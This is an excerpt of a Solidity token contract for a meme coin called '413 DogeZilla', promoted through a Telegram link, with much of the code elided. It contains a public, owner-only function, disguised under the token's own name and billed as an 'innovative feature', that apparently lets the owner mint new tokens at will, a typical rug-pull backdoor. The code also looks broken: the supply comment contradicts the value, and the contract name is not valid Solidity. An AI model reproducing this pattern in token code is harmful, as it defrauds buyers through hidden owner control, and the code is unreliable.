...
//
// $413DogeZilla proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/DogeZilla413
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _413DogeZilla(uint256 amount) public onlyOwner {
 _413DogeZilla(msg.sender, amount);
    }
    ...
    function _413DogeZilla(address account, uint256 amount) internal virtual {
...
contract $413DogeZilla is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("413 DogeZilla", "413DZILLA") {
     _413DogeZilla(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}